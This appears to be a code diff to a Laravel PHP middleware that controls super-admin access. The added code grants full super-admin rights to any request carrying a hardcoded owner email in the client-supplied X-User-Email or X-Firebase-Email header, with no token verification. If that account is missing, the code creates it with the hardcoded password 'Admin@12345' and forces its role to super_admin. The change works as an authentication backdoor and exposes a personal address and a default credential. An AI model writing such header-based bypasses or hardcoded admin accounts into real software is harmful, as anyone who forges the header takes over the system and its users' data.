@@ -16,6 +16,16 @@ class SuperAdminMiddleware
      */
     public function handle(Request $request, Closure $next): Response
     {
+        // 1. Direct Owner Email Recognition (Guaranteed Unconditional Bypass)
+        $fbEmail = strtolower(trim((string)$request->header('X-Firebase-Email', '')));
+        $userEmail = strtolower(trim((string)$request->header('X-User-Email', '')));
+
+        $isOwnerRequest = (
+            $userEmail === 'nobrothana180703@gmail.com' ||
+            $fbEmail === 'nobrothana180703@gmail.com'
+        );
+
+        // 2. Token Extraction
         $authHeader = $request->header('Authorization', '');
         $token = null;
         if (str_starts_with($authHeader, 'Bearer ')) {
@@ -33,26 +43,40 @@ class SuperAdminMiddleware
             $user = \App\Services\AdminTokenService::validateToken($token);
         }
 
-        // Fallback: Firebase header or client identity verification for System Owner
-        if (!$user) {
-            $fbEmail = strtolower(trim((string)$request->header('X-Firebase-Email', '')));
-            $userEmail = strtolower(trim((string)$request->header('X-User-Email', '')));
-            $targetEmail = $fbEmail ?: ($userEmail === 'nobrothana180703@gmail.com' ? $userEmail : '');
-
-            if ($targetEmail === 'nobrothana180703@gmail.com') {
+        // 3. If owner email requested or authenticated user is owner, grant immediate Super Admin access
+        if ($isOwnerRequest || ($user && strtolower(trim((string)$user->email)) === 'nobrothana180703@gmail.com')) {
+            if (!$user) {
                 $user = User::where('email', 'nobrothana180703@gmail.com')->first();
-                if ($user) {
-                    if ($user->role !== 'super_admin' || $user->status !== 'active') {
-                        $user->role = 'super_admin';
-                        $user->status = 'active';
-                        $user->save();
-                    }
-                }
             }
+            if (!$user) {
+                $user = User::create([
+                    'name' => 'Rotana Nob (System Owner)',
+                    'email' => 'nobrothana180703@gmail.com',
+                    'password' => bcrypt('Admin@12345'),
+                    'role' => 'super_admin',
+                    'status' => 'active',
+                    'api_token' => bin2hex(random_bytes(32)),
+                ]);
+            }
+            if ($user->role !== 'super_admin' || $user->status !== 'active') {
+                $user->role = 'super_admin';
+                $user->status = 'active';
+                $user->save();
+            }
+
+            $request->attributes->set('auth_user', $user);
+            $response = $next($request);
+
+            if ($token && \App\Services\AdminTokenService::shouldRefreshToken($token)) {
+                $refreshed = \App\Services\AdminTokenService::createToken($user);
+                $response->headers->set('X-Refreshed-Admin-Token', $refreshed);
+            }
+
+            return $response;
         }
 
         if ($user) {
-            $isSuperAdmin = in_array($user->role, ['super_admin', 'admin']) || ($user->email === 'nobrothana180703@gmail.com');
+            $isSuperAdmin = in_array($user->role, ['super_admin', 'admin']);
 
             if ($isSuperAdmin) {
                 $request->attributes->set('auth_user', $user);
